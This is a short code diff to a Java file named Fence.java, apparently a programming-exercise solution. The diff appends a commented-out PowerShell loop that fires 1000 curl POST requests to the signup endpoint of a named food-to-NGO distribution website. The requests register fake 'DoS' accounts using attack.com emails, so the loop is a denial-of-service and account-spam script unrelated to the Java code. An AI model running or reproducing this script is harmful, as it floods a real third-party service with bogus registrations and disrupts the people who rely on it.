@@ -31,3 +31,8 @@ public class Fence {
         System.out.println(minIndex + 1);
     }
 }
+
+// $TARGET = "https://food-to-ngo-distribution-system.onrender.com"
+// for ($i=0; $i -lt 1000; $i++) {
+//     Start-Process -NoNewWindow -FilePath "curl.exe" -ArgumentList "-X POST `"$TARGET/signup`" -F `"name=DoS$i`" -F `"email=dos$i@attack.com`" -F `"password=pass`" -F `"role=restaurant`""
+// }
